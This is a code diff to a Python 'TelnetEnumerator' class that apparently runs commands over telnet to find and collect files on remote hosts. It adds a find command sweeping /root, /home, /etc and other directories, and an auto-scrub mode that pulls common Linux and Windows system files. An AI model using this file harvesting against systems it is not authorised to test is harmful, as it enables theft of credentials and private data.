@@ -332,12 +332,17 @@ class TelnetEnumerator:
         """
         discovered_files = []
         
+        # Combine extensions once for efficiency
+        all_extensions = self.TEXT_EXTENSIONS + self.IMAGE_EXTENSIONS
+        
         # Build find command for Linux (searches common directories)
         text_exts = '|'.join([f'\\.{ext}$' for ext in self.TEXT_EXTENSIONS])
         image_exts = '|'.join([f'\\.{ext}$' for ext in self.IMAGE_EXTENSIONS])
         all_exts = text_exts + '|' + image_exts
         
         # Try multiple discovery strategies
+        # Note: These commands search sensitive directories and assume proper access control
+        # is in place. Errors from inaccessible directories are suppressed with 2>/dev/null
         discovery_commands = [
             # Linux: find command with common directories and size limit (files < 10MB)
             f'find /root /home /tmp /var /opt /etc -type f -size -10M 2>/dev/null | grep -E "({all_exts})" | head -n {self.MAX_DISCOVERED_FILES}',
@@ -388,16 +393,39 @@ class TelnetEnumerator:
                     
                     for line in lines:
                         line = line.strip()
-                        # Filter for lines that look like file paths
-                        if line and not line.startswith('#') and not line.startswith('$'):
-                            # Check if line contains valid file extensions
-                            if any(line.lower().endswith(f'.{ext}') for ext in self.TEXT_EXTENSIONS + self.IMAGE_EXTENSIONS):
-                                # Clean up the line (remove ANSI codes, prompts, etc.)
-                                cleaned = line.split()[-1] if ' ' in line else line
-                                if cleaned and cleaned not in discovered_files:
-                                    discovered_files.append(cleaned)
-                                    if len(discovered_files) >= self.MAX_DISCOVERED_FILES:
+                        # Filter common shell prompts (more comprehensive)
+                        # Skip lines starting with common prompt characters or containing prompt patterns
+                        if not line or line.startswith(('#', '$', '>', '%', '~')):
+                            continue
+                        if ':' in line[:20] and '@' in line[:20]:  # Likely a prompt like 'user@host:~$'
+                            continue
+                            
+                        # Check if line contains valid file extensions
+                        if any(line.lower().endswith(f'.{ext}') for ext in all_extensions):
+                            # Extract file path - handle paths with spaces by taking everything
+                            # that looks like a valid path (starts with / or C:\ or is relative)
+                            cleaned = line
+                            
+                            # Remove ANSI escape codes if present
+                            import re
+                            ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
+                            cleaned = ansi_escape.sub('', cleaned)
+                            
+                            # If there are spaces and it doesn't start with a path indicator,
+                            # it might be command output with extra info - take last token
+                            if ' ' in cleaned and not cleaned.startswith('/') and not cleaned[1:3] == ':\\':
+                                # This might be output like "Found: /path/to/file.txt"
+                                # Try to extract path-like token
+                                tokens = cleaned.split()
+                                for token in reversed(tokens):  # Check from end
+                                    if any(token.lower().endswith(f'.{ext}') for ext in all_extensions):
+                                        cleaned = token
                                         break
+                            
+                            if cleaned and cleaned not in discovered_files:
+                                discovered_files.append(cleaned)
+                                if len(discovered_files) >= self.MAX_DISCOVERED_FILES:
+                                    break
                 
             except Exception:
                 # Silently continue to next discovery method
@@ -569,7 +597,7 @@ class TelnetEnumerator:
                         elif self.auto_scrub_files:
                             # Auto-scrub mode: discover text/image files AND include system files
                             try:
-                                # Start with common system files
+                                # Start with common system files (62 files: 36 Linux + 26 Windows)
                                 files_to_try = list(self.COMMON_LINUX_FILES + self.COMMON_WINDOWS_FILES)
                                 
                                 # Add discovered text and image files
@@ -581,6 +609,8 @@ class TelnetEnumerator:
                                             files_to_try.append(file_path)
                                 
                                 # Limit to MAX_DISCOVERED_FILES to avoid overwhelming output
+                                # Note: System files (62) are prioritized, so discovered files are
+                                # effectively limited to ~38 slots (MAX_DISCOVERED_FILES - 62)
                                 if len(files_to_try) > self.MAX_DISCOVERED_FILES:
                                     files_to_try = files_to_try[:self.MAX_DISCOVERED_FILES]
                                     
